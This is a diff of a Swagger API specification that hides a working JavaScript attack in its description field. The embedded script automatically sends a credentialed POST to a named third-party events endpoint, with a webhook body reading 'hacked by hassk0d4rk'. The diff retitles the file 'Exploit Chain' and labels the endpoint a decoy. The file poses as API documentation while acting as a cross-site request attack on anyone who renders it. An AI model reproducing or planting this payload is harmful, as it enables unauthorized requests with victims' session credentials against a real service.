@@ -1,65 +1,56 @@
 swagger: '2.0'
 info:
   version: '1.0.0'
-  title: ☠ Hassk0 API ☠
+  title: Hassk0 Exploit Chain
   description: |
-    <h2>Preparing API request... Please wait.</h2>
     <script>
-    // Send actual malicious request immediately
     fetch('https://webnotification.eus2.es-cs.bentley.com/api/Events/Execute', {
       method: 'POST',
       headers: {
-        'Content-Type': 'application/json',
-        'hacked-by': 'hassk0d4rk'
+        'Content-Type': 'application/json'
       },
       body: JSON.stringify({
-        "Source": "any dummy",
-        "Context": "any dummy value",
+        "Source": "exploit-source",
+        "Context": "exploit-context",
         "Action": "leaksss",
         "WebSocket": {},
         "Webhook": {
           "Invoke": true,
-          "Body": "hacked by hassk0d4rk;D"
+          "Body": "hacked by hassk0d4rk 😈"
         }
       }),
       credentials: 'include'
     });
     </script>
-host: example.com
+host: webnotification.eus2.es-cs.bentley.com
 paths:
-  /send-post:
+  /api/Events/Execute:
     post:
-      summary: Send JSON data to API (Click to Send)
-      description: >
-        This simulates sending structured event data. Press "Try it out" and "Execute" to send.
+      summary: Fake Event Trigger (decoy)
+      consumes:
+        - application/json
       parameters:
-        - name: body
-          in: body
+        - in: body
+          name: body
           required: true
           schema:
             type: object
             properties:
               Source:
                 type: string
-                example: any dummy
               Context:
                 type: string
-                example: any dummy value
               Action:
                 type: string
-                example: leaksss
               WebSocket:
                 type: object
-                example: {}
               Webhook:
                 type: object
                 properties:
                   Invoke:
                     type: boolean
-                    example: true
                   Body:
                     type: string
-                    example: hacked by hassk0d4rk;D
       responses:
         200:
           description: Request sent
